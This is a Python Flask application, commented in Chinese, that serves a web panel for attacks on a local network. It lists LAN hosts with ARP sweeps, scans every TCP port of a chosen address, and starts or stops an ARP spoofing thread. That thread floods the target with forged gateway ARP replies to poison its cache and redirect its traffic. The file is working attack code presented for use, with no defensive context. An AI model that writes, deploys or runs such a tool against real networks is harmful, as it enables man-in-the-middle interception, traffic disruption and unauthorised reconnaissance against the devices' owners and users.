from flask import Flask, render_template, request, jsonify
import threading
import socket
from scapy.all import ARP, Ether, sendp, srp1, get_if_hwaddr, conf
import time
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# 全局变量，用于控制 ARP 欺骗线程
arp_spoofing_thread = None
arp_spoofing_active = False

import logging

# 配置日志
logging.basicConfig(
    format='%(asctime)s - %(message)s',  # 时间戳和消息
    level=logging.INFO,  # 设置日志级别
    datefmt='%Y-%m-%d %H:%M:%S'  # 时间格式
)


# 获取本机 MAC 地址
def get_local_mac(interface):
    return get_if_hwaddr(interface)


# 获取目标或网关的 MAC 地址
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    response = srp1(packet, timeout=2, verbose=0)
    if response:
        return response.hwsrc
    return None


# 获取默认接口
def get_default_interface():
    return conf.iface


# 运行 ARP 欺骗的函数
def arp_spoof(target_ip, target_mac, gateway_ip, local_mac, interface):
    global arp_spoofing_active
    while arp_spoofing_active:
        # 构建带有以太网帧的 ARP 响应包
        arp_response = (
                Ether(src=local_mac, dst=target_mac) /  # 指定源和目标的 MAC 地址
                ARP(
                    op=2,  # ARP 回复
                    psrc=gateway_ip,  # 伪装的源 IP 地址（网关）
                    pdst=target_ip,  # 目标设备的 IP 地址
                    hwsrc=local_mac,  # 本机 MAC 地址
                    hwdst=target_mac  # 目标设备的 MAC 地址
                )
        )

        # 发送伪造的 ARP 响应包
        sendp(arp_response, iface=interface, verbose=False)
        logging.info("Spoofing ARP response")
        # time.sleep(2)


# 单个 IP 的扫描任务
def scan_ip(ip):
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request

    try:
        # 发送请求并等待回复
        response = srp1(packet, timeout=1, verbose=0)
        if response:
            mac = response.hwsrc
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except socket.herror:
                hostname = "Unknown"
            return {'ip': ip, 'mac': mac, 'hostname': hostname}
    except Exception as e:
        logging.info(f"Error scanning IP {ip}: {e}")

    return None


# 多线程扫描网络设备
def scan_network(network="192.168.50.0/24"):
    start_time = time.time()  # 记录开始时间

    # 提取网络 IP 前缀
    ip_prefix = network.rsplit('.', 1)[0]
    ip_range = [f"{ip_prefix}.{i}" for i in range(1, 255)]  # 生成 IP 地址范围

    devices = []
    with ThreadPoolExecutor(max_workers=1000) as executor:
        results = executor.map(scan_ip, ip_range)
        devices = [result for result in results if result is not None]

    end_time = time.time()  # 记录结束时间
    elapsed_time = end_time - start_time  # 计算扫描用时
    logging.info(f"Network scan completed in {elapsed_time:.2f} seconds.")  # 打印用时

    return devices


scan_progress = 0
scan_total_ports = 65535
scan_lock = threading.Lock()

# 单个端口扫描任务
def scan_port(ip, port):
    global scan_progress
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        sock.close()

        # 更新进度
        with scan_lock:
            scan_progress += 1

        return port if result == 0 else None
    except Exception as e:
        logging.info(f"Error scanning port {port} on {ip}: {e}")
        return None


# 扫描指定 IP 的端口
def scan_ports(ip, start_port=1, end_port=65535):
    open_ports = []
    with ThreadPoolExecutor(max_workers=10000) as executor:
        results = executor.map(lambda port: scan_port(ip, port), range(start_port, end_port + 1))
        open_ports = [port for port in results if port is not None]
    return open_ports


@app.route('/api/scan_ports', methods=['POST'])
def api_scan_ports():
    ip = request.form.get('ip')
    if not ip:
        return jsonify({'error': 'No IP address provided'}), 400

    logging.info(f"Scanning ports on {ip}")
    open_ports = scan_ports(ip)

    # 检查是否有开放端口，如果没有，提供相应的消息
    if open_ports:
        return jsonify({'ip': ip, 'open_ports': open_ports})
    else:
        return jsonify({'ip': ip, 'open_ports': [], 'message': 'No open ports found'})


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/control', methods=['POST'])
def control():
    global arp_spoofing_thread, arp_spoofing_active
    action = request.form.get('action')

    if action == 'start':
        if arp_spoofing_active:
            return 'ARP Spoofing is already running!'

        # 获取输入的目标 IP、目标 MAC 和网关 IP
        target_ip = request.form.get('target_ip')
        gateway_ip = request.form.get('gateway_ip')
        interface = get_default_interface()
        local_mac = get_local_mac(interface)
        target_mac = get_mac(target_ip)

        if not target_mac:
            return 'Unable to obtain target MAC address. Please check the IP address.'

        # 启动 ARP 欺骗线程
        arp_spoofing_active = True
        arp_spoofing_thread = threading.Thread(target=arp_spoof,
                                               args=(target_ip, target_mac, gateway_ip, local_mac, interface))
        arp_spoofing_thread.start()
        logging.info(f"started... Target IP: {target_ip}, Target MAC: {target_mac}, Gateway IP: {gateway_ip}")  # 调试日志

        return 'ARP Spoofing started!'

    elif action == 'stop':
        arp_spoofing_active = False  # 设置标志为 False，停止 ARP 欺骗线程
        if arp_spoofing_thread and arp_spoofing_thread.is_alive():
            logging.info(f"stopping...")  # 调试日志
            arp_spoofing_thread.join()  # 等待线程终止
            logging.info(f"stopped")  # 调试日志

        return 'ARP Spoofing stopped.'

    return 'Invalid action!'


@app.route('/api/devices')
def api_devices():
    # 扫描网络设备并返回 JSON 格式数据
    network_devices = scan_network()
    return jsonify(network_devices)


# 新增：获取扫描进度的 API
@app.route('/api/scan_progress')
def scan_progress_status():
    with scan_lock:
        progress = int((scan_progress / scan_total_ports) * 100)
    return jsonify({'progress': progress})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
